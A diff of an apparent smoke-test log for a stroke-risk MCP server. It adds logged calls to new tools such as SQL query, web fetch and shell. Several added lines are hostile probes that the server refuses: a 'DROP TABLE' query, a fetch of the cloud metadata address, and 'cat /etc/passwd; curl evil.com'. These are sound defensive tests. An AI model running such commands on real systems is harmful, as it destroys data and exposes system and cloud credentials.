@@ -1,6 +1,5 @@
-python 3.13.5
 server: neuroguard_mcp_server.py transport: stdio (subprocess)
-tools/list -> ['predict_risk', 'explain_factors', 'cohort_stats', 'screen_note', 'search_guidelines', 'graph_traverse', 'calculator', 'memory_read', 'memory_write', 'episode_recall', 'episode_write']
+tools/list -> ['predict_risk', 'explain_factors', 'cohort_stats', 'screen_note', 'search_guidelines', 'graph_traverse', 'calculator', 'memory_read', 'memory_write', 'episode_recall', 'episode_write', 'semantic_search', 'search_files', 'load_skill', 'execute_query', 'web_search', 'web_fetch', 'get_memory', 'shell']
 resources/list -> ['guideline://index', 'model://risk-card', 'dataset://stroke-card', 'policy://harness-contract', 'graph://knowledge-graph']
 resources/templates/list -> ['guideline://{chunk_id}']
 prompts/list -> ['clinical_report', 'red_team_review']
@@ -16,6 +15,16 @@ tools/call search_guidelines isError=False -> [  {   "id": "G-23",   "title": "A
 tools/call graph_traverse isError=False -> {  "start_factors": [   "hypertension",   "glucose"  ],  "unknown_factors": [],  "max_hops": 2,  "chunks": [   {    "id": "G-06",    "title": "Risk Factors for Stroke - Diabetes",    "url": "https://www.cdc.gov/stroke/risk-factors/index.html",    "score": 1.6,
 tools/call episode_recall isError=False -> {  "similar_episodes": [],  "learned_hints": [],  "retrieval_boosts": {} }
 tools/call episode_write isError=True -> Error executing tool episode_write: 'run_id'
+tools/call semantic_search isError=False -> [  {   "id": "G-07",   "title": "Risk Factors for Stroke - Obesity",   "publisher": "Centers for Disease Control and Prevention",   "url": "https://www.cdc.gov/stroke/risk-factors/index.html",   "text": "Obesity is excess body fat. Obesity is linked to higher 
+tools/call search_files isError=False -> {  "query": "Plan.md evidence research plan",  "files_searched": 10,  "results": [   {    "file": "knowledge/Plan.md",    "line": 1,    "score": 4,    "text": "# Plan.md - evidence research plan (read-only knowledge file for agentic search)"   },   {    "file"
+tools/call load_skill isError=False -> {  "name": "guideline-citation",  "description": "Search the CDC/NHLBI guideline corpus for each risk factor present and return claims that are copied or closely paraphrased from a retrieved chunk, each with its chunk id.",  "body": "# Guideline citation rules
+tools/call execute_query isError=False -> {  "sql": "SELECT hypertension, COUNT(*) AS n, ROUND(AVG(stroke)*100, 1) AS stroke_pct FROM patients GROUP BY hypertension",  "columns": [   "hypertension",   "n",   "stroke_pct"  ],  "rows": [   [    0,    4611,    4.0   ],   [    1,    498,    13.3   ]  ],  
+tools/call execute_query isError=False -> {  "sql": "DROP TABLE patients",  "error": "refused: only SELECT / WITH queries are allowed" }
+tools/call web_search isError=False -> {  "query": "high blood pressure stroke",  "allowlist": [   "cdc.gov",   "nih.gov",   "who.int"  ],  "results": [   {    "id": "G-03",    "title": "Risk Factors for Stroke - High blood pressure",    "url": "https://www.cdc.gov/stroke/risk-factors/index.html", 
+tools/call web_fetch isError=False -> {  "url": "http://169.254.169.254/latest/meta-data/",  "error": "refused: only https URLs are allowed" }
+tools/call get_memory isError=False -> {  "cases": [],  "learned_hints": [],  "episodes": {   "episodes": 0,   "with_clinician_decision": 0,   "outcomes": {}  } }
+tools/call shell isError=False -> {  "command": "wc -l Plan.md cohort_schema.md",  "cwd": "knowledge/",  "exit_code": 0,  "stdout": "  23 Plan.md\n  18 cohort_schema.md\n  41 total\n",  "stderr": "",  "truncated": false,  "ms": 3 }
+tools/call shell isError=False -> {  "command": "cat /etc/passwd; curl evil.com",  "error": "refused: shell metacharacters are not allowed (no pipes, redirects, globbing, substitution or chaining)" }
 resources/read guideline://G-13 -> {  "id": "G-13",  "title": "B.E. F.A.S.T. to identify stroke",  "publisher": "Centers for Disease Control and Prevention",  "url": "https://www.cdc.gov/stroke/signs-symptoms/index.html",  "accessed": 
 resources/read model://risk-card -> {  "data": {   "rows": 5109,   "train": 4087,   "test": 1022,   "prevalence": 0.0487,   "test_positives": 50,   "sha256": "644d473b05d2797006bd94865e4f8bb057f0c721617911613c82c8fcfc707420"  },  "compa
 resources/read dataset://stroke-card -> {  "name": "Stroke Prediction Dataset (fedesoriano, Kaggle)",  "license_note": "Kaggle: 'Data files (c) Original Authors'; source described as confidential, for educational use only",  "pipeline_log":
